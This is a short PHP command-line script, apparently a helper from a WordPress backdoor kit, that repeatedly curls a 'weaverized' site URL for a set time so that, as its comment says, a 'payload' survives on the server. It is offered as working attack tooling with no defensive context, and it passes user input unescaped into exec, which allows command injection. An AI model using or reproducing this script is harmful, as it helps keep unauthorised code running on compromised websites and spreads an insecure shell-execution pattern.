<?php 
$target = "";
$duration = 180;//default hold session for 3 minutes
if ( isset($argv) && sizeof($argv) >= 2 && strlen($argv[1]) > 9 ){
    $target = $argv[1];
    $duration = isset($argv[2]) ? (int) $argv[2] : $duration;
}else{
    echo "\nUsage: php peer.php http(s)://location_of_wp_weaverized?peer=ok  time_in_seconds\n";
    exit();
}
$st = time();
while ( true ){
    //touch weaver.stop in the same folder in order to force stop it and payload to survive on the server
    if ( !file_exists("weaver.stop") ) exec("curl ".$target);
    $ct = time();
    if ( ($ct - $st) > $duration ) break;
}
